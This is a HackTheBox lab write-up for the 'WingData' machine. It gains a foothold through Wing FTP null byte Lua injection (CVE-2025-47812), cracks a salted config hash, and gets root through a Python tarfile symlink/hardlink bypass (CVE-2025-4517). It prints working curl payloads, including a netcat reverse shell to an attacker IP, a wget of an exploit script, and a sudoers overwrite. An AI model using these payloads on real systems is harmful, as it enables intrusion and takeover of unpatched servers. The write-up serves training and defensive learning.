---
title: WingData
tags:
  - HackTheBox
  - Linux
  - RCE
  - CVE-2025-47812
  - CVE-2025-4517
  - Wing FTP
  - Null Byte Injection
  - Tarfile
  - Privilege Escalation
  - Password Cracking
categories:
  - HackTheBox
position: right
cover: '/img/wingdata-cover.png'
description: 'HTB Easy Linux machine — Wing FTP RCE via Null Byte Injection (CVE-2025-47812), credential harvesting, and root via Python tarfile symlink bypass (CVE-2025-4517)'
date: 2026-06-25 12:00:00
---

> **Difficulty**: <span style="color:#9fef00">Easy</span> &nbsp;|&nbsp; **Category**: <span style="color:#9fef00">Linux</span>

## Overview

WingData is an Easy Linux machine centred around **Wing FTP Server** — a self-hosted FTP/HTTP file server accessible via a virtual host. The attack path chains together two real-world CVEs:

1. **CVE-2025-47812** — Null byte injection in Wing FTP Server allows unauthenticated Remote Code Execution via Lua session file poisoning.
2. **CVE-2025-4517** — A Python `tarfile` filter bypass using symlinks and hardlinks to perform arbitrary file write, escalating from a low-privilege shell to root.

<!-- more -->

---

## Enumeration

### Port Scan

Starting with a full port scan to see what's exposed:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- 10.129.244.106 -T4
Starting Nmap 7.99 ( https://nmap.org )
Nmap scan report for wingdata.htb (10.129.244.106)
Host is up (0.081s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Two ports open — SSH on 22 and HTTP on 80. A service version scan reveals more detail:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p22,80 10.129.244.106

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: WingData Solutions
```

---

### Virtual Host Enumeration

The machine is running Apache as a reverse proxy. Fuzzing for virtual hosts reveals an interesting subdomain:

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster vhost -u http://wingdata.htb \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  --append-domain -xs 300-500

Found: ftp.wingdata.htb  Status: 200 [Size: 678]
```

Adding `ftp.wingdata.htb` to `/etc/hosts` and navigating to it reveals a **Wing FTP Server** web interface — a self-hosted FTP management panel with anonymous login enabled.

![Wing FTP Server web interface at ftp.wingdata.htb](/img/wingdata-ftp-panel.png)

---

## Foothold — CVE-2025-47812 (Wing FTP Null Byte RCE)

### What is CVE-2025-47812?

> **CVE-2025-47812** is a critical Remote Code Execution vulnerability in **Wing FTP Server < 7.4.4**. The flaw lies in how the server processes the `username` field during authentication: if a **null byte (`%00`)** is present in the username, the server only evaluates the portion *before* the null byte for authentication purposes — anything after it is ignored for the auth check but **still written into the session file**.

Wing FTP stores session data as **Lua script files** in its `/session/` directory. The session file for a user looks like this:

```lua
_SESSION["username"] = [[ anonymous ]]
```

An attacker can craft a username that:
1. Passes authentication (e.g. `anonymous` before `%00`)
2. Injects arbitrary Lua code *after* the null byte, which closes the string literal and executes as code

**The exploit chain:**

```
1. Login with: anonymous%00]]<lua payload>--
2. Wing FTP writes the full username (including Lua) to the session file
3. The ]] closes the [[ string literal → remaining content executes as Lua
4. Triggering any authenticated endpoint (e.g. /dir.html) loads and runs the session file
```

---

### Step 1: Verify RCE with `whoami`

First, test the vulnerability with a simple `whoami` command:

```bash
curl -s -X POST "http://ftp.wingdata.htb/loginok.html" \
  -H "Referer: http://ftp.wingdata.htb/login.html?lang=english" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=anonymous%00]]%0dlocal+h+%3d+io.popen(%22whoami%22)%0dlocal+r+%3d+h%3aread(%22*a%22)%0dh%3aclose()%0dprint(r)%0d--&password=anonymous&password_val=" \
  -c /tmp/cookies_1.txt
```

Triggering the session:

```bash
curl -s -X POST "http://ftp.wingdata.htb/dir.html" \
  -b /tmp/cookies_1.txt

wingftp   ← RCE confirmed!
```

The server is running as the `wingftp` user.

---

### Step 2: Get a Reverse Shell

Set up a listener on port 1234, then inject a netcat reverse shell payload:

```bash
# Payload (URL-decoded):
# anonymous\x00]]
# local h = io.popen("nc 10.10.15.30 1234 -e /bin/bash")
# local r = h:read("*a")
# h:close()
# print(r)
# --

curl -s -X POST "http://ftp.wingdata.htb/loginok.html" \
  -H "Referer: http://ftp.wingdata.htb/login.html?lang=english" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=anonymous%00]]%0dlocal+h+%3d+io.popen(%22nc+10.10.15.30+1234+-e+/bin/bash%22)%0dlocal+r+%3d+h%3aread(%22*a%22)%0dh%3aclose()%0dprint(r)%0d--&password=anonymous&password_val=" \
  -c /tmp/cookies_4.txt
```

Then trigger the session:

```bash
curl -s -X POST "http://ftp.wingdata.htb/dir.html" \
  -b /tmp/cookies_4.txt
```

> The server crashes (502 Proxy Error) — that's expected. The crash means the shell connected outbound.

Shell received as `wingftp`!

---

## Lateral Movement — Cracking the `wacky` User's Password

### Finding Credentials in Wing FTP Config Files

Wing FTP stores its configuration and user accounts as XML files in `/opt/wftpserver/Data/`. Browsing the user account files:

```bash
wingftp@wingdata:/opt/wftpserver/Data/1/users$ cat wacky.xml
```

Inside `wacky.xml`, a SHA-256 password hash is stored:

```
<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
```

The domain config (`domain.xml`) reveals salting is enabled with the salt `WingFTP`:

```xml
<EnablePasswordSalting>1</EnablePasswordSalting>
<SaltingString>WingFTP</SaltingString>
```

So the hash format is **SHA-256(password + "WingFTP")** — hashcat mode `1410`.

---

### Cracking with Hashcat

```bash
echo '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP' > wacky_hash.txt

hashcat -m 1410 wacky_hash.txt /usr/share/wordlists/rockyou.txt
```

Password cracked in **6 seconds**:

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```

---

### SSH as `wacky`

```bash
wingftp@wingdata:/opt/wftpserver/Data/1/users$ ssh wacky@localhost

wacky@wingdata:~$ cat user.txt
528423035023ff2d4078ec7c06b47e3f
```

🚩 **User flag captured!**

---

## Privilege Escalation — CVE-2025-4517 (Python tarfile Symlink Bypass)

### Checking sudo Permissions

```bash
wacky@wingdata:~$ sudo -l

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

`wacky` can run a Python backup restoration script as **root**. Let's read it.

---

### Analysing the Vulnerable Script

The script `restore_backup_clients.py` does the following:
1. Validates the backup filename with a regex (`backup_<digits>.tar`)
2. Validates the restore directory name
3. Opens the tar file and extracts it using:

```python
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```

The `filter="data"` was introduced in Python 3.12 as a *safety measure* — but **CVE-2025-4517** bypasses it entirely.

---

### What is CVE-2025-4517?

> **CVE-2025-4517** is a critical Python `tarfile` vulnerability affecting versions **3.8.0 – 3.13.1**. Even with `filter="data"` applied, a crafted tar archive can use a combination of **symlinks** and **hardlinks** to write arbitrary content to locations outside the extraction directory — including `/etc/sudoers`.

**Attack flow:**

```
1. Create deep nested directories (247-char names × 16 levels deep)
   → Confuses the path resolution engine

2. Build a symlink chain pointing up through the tree
   → Effectively traverses out of the extraction root

3. Create an "escape" symlink resolving to /etc
   → Points outside the sandbox boundary

4. Create a hardlink through the escape symlink to /etc/sudoers
   → hardlink "sudoers_link" → escape/sudoers → /etc/sudoers

5. Write content to the hardlink entry in the tar
   → Content lands directly in /etc/sudoers
```

The key insight: `filter="data"` blocks absolute paths and `..` traversal in *filenames*, but it doesn't fully track the **resolved destination** of a chain of symlinks followed by a hardlink. The hardlink ends up pointing at the same inode as `/etc/sudoers`.

---

### Exploitation

Clone the public PoC on your attack machine and serve it:

```bash
git clone https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData.git
cd CVE-2025-4517-POC-HTB-WingData
python3 -m http.server 9000
```

On the target, download and run it:

```bash
wacky@wingdata:~$ wget http://10.10.15.30:9000/CVE-2025-4517-POC.py
wacky@wingdata:~$ python3 CVE-2025-4517-POC.py
```

```
╔═══════════════════════════════════════════════════════════╗
║     CVE-2025-4517 Tarfile Exploit                         ║
║     Privilege Escalation via Symlink + Hardlink Bypass    ║
╚═══════════════════════════════════════════════════════════╝

[*] Phase 1: Building nested directory structure...
[*] Phase 2: Creating symlink chain for path traversal...
[*] Phase 3: Creating escape symlink to /etc...
[*] Phase 4: Creating hardlink to /etc/sudoers...
[*] Phase 5: Writing sudoers entry...
[+] Exploit tar created: /tmp/cve_2025_4517_exploit.tar
[+] Exploit deployed successfully
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn_9999

[+] SUCCESS! User 'wacky' added to sudoers
[+] Entry: wacky ALL=(ALL) NOPASSWD: ALL

[+] EXPLOITATION SUCCESSFUL!
[?] Spawn root shell now? (y/n): y

root@wingdata:/home/wacky# cat /root/root.txt
b414dd33c4ad9d3541f2202f81f7149e
```

🚩 **Root flag captured!**

---

## Summary

| Stage | Technique | CVE |
|---|---|---|
| **Foothold** | Null byte injection → Lua code execution in session file → Reverse shell | CVE-2025-47812 |
| **Lateral Movement** | Wing FTP XML config → SHA-256 salted hash → hashcat → SSH as `wacky` | — |
| **Privilege Escalation** | Python tarfile symlink+hardlink bypass → arbitrary write to `/etc/sudoers` → root | CVE-2025-4517 |

---

## Key Takeaways

- **Null byte handling** is a classic but still dangerous mistake. Any user-supplied string that gets written to a file or interpreted as code must be sanitised *before* storage, not just at auth-check time.
- **Session files as Lua code** is an inherently risky design — user-controlled data should never be treated as executable.
- **`filter="data"` is not a silver bullet.** Python's tarfile safety filters were a step in the right direction, but CVE-2025-4517 showed that multi-step symlink+hardlink chains can still escape the sandbox. Always validate final resolved paths, not just the raw names in the archive.
- **Credential reuse in config files** is a common post-exploitation win — always check service config directories for stored credentials.

---

Have a nice day, and see you in the next writeup!  
Any feedback in the comments section is very appreciated. 🙏
